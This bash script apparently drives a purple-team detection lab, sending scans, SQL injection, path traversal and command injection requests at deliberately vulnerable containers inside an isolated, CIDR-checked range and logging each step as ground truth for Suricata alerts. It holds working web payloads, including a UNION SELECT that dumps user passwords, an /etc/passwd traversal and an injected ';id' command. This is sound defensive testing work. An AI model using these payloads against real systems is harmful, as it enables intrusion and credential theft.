#!/usr/bin/env bash
# Generates known-bad traffic inside the isolated range so every detection layer has something to fire on.
# Every step is logged to data/drills.jsonl (ground truth for the Red / Purple / White views).
#
# Attribution: each HTTP step stamps a unique marker "cc-step/<step_id>" into its User-Agent; Suricata alerts carry the
# request UA, so cc/teams.py can attribute alerts to exactly one step. Non-HTTP steps (nmap) are attributed by Suricata
# packet time inside the step window. Scope: every target is checked against the range CIDR before anything runs.
set -euo pipefail
cd "$(dirname "$0")/.."
DC=(docker compose --env-file .env -f range/compose.yml)
A=("${DC[@]}" exec -T attacker)
RANGE_CIDR=172.30.0.0/24
ATTACKER=172.30.0.10
JUICE=172.30.0.20
DVWA=172.30.0.30
LOG=data/drills.jsonl
mkdir -p data
DRILL_ID="drill-$(date -u +%Y%m%dT%H%M%SZ)"
UA_BASE="Mozilla/5.0 (X11; Linux x86_64)"
N=0

in_range() {  # non-negotiable 1, enforced in code: refuse any target outside the range
  python3 -c 'import ipaddress,sys; sys.exit(0 if ipaddress.ip_address(sys.argv[1]) in ipaddress.ip_network(sys.argv[2]) else 1)' "$1" "$RANGE_CIDR"
}
for ip in "$ATTACKER" "$JUICE" "$DVWA"; do in_range "$ip" || { echo "refusing: $ip is outside $RANGE_CIDR" >&2; exit 2; }; done

# run_step <step-name> <technique> <tactic> <target-ip> <tool> <http:yes|no> -- <command...>
# For http=yes the command can use $MARKER_UA (exported for the step).
run_step() {
  local name=$1 tech=$2 tactic=$3 target=$4 tool=$5 http=$6; shift 7
  in_range "$target" || { echo "refusing step '$name': target $target is outside $RANGE_CIDR" >&2; exit 2; }
  N=$((N + 1))
  local step_id="$DRILL_ID-s$N" marker=""
  [[ "$http" == yes ]] && marker="cc-step/$step_id"
  export MARKER_UA="$UA_BASE $marker"
  echo; echo "== [$tech] $name ($step_id) =="
  local start end rc=0
  start=$(date +%s%3N)
  "$@" || rc=$?
  end=$(date +%s%3N)
  python3 - "$DRILL_ID" "$step_id" "$name" "$tech" "$tactic" "$ATTACKER" "$target" "$tool" "$marker" "$start" "$end" "$rc" >> "$LOG" <<'EOF'
import json, sys
k = ["drill_id", "step_id", "step", "technique", "tactic", "src_ip", "target", "tool", "marker"]
v = sys.argv[1:]
rec = dict(zip(k, v[:9]))
rec["marker"] = rec["marker"] or None
rec.update(start_ms=int(v[9]), end_ms=int(v[10]), exit=int(v[11]))
print(json.dumps(rec))
EOF
}

run_step "SYN scan of range" T1595 Reconnaissance "$JUICE" nmap no -- \
  "${A[@]}" nmap -sS -T4 -p 1-2000 --max-retries 1 "$JUICE" "$DVWA" -oN /dev/null

run_step "SQLi probes on Juice Shop search" T1190 "Initial Access" "$JUICE" curl yes -- bash -c '
  "$@" curl -s -o /dev/null -w "%{http_code}\n" -A "$MARKER_UA" "http://'"$JUICE"':3000/rest/products/search?q=%27%20OR%201%3D1--"
  "$@" curl -s -o /dev/null -w "%{http_code}\n" -A "$MARKER_UA" "http://'"$JUICE"':3000/rest/products/search?q=x%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--"
' _ "${A[@]}"

run_step "Path traversal on Juice Shop" T1190 "Initial Access" "$JUICE" curl yes -- \
  bash -c '"$@" curl -s -o /dev/null -w "%{http_code}\n" -A "$MARKER_UA" --path-as-is "http://'"$JUICE"':3000/ftp/../../../../etc/passwd"' _ "${A[@]}"

run_step "Nikto vulnerability scan of DVWA" T1595.002 Reconnaissance "$DVWA" nikto yes -- \
  bash -c '"$@" timeout 60 nikto -h "http://'"$DVWA"'" -maxtime 55 -useragent "$MARKER_UA" -o /dev/null -Format txt' _ "${A[@]}"

run_step "Command injection on DVWA exec" T1190 "Initial Access" "$DVWA" curl yes -- \
  bash -c '"$@" curl -s -o /dev/null -w "%{http_code}\n" -A "$MARKER_UA" -d "ip=127.0.0.1;id&Submit=Submit" "http://'"$DVWA"'/vulnerabilities/exec/"' _ "${A[@]}"

echo; echo "Drill $DRILL_ID logged to $LOG. Allow ~60 s for EVE -> manager -> indexer, then check the Purple view."
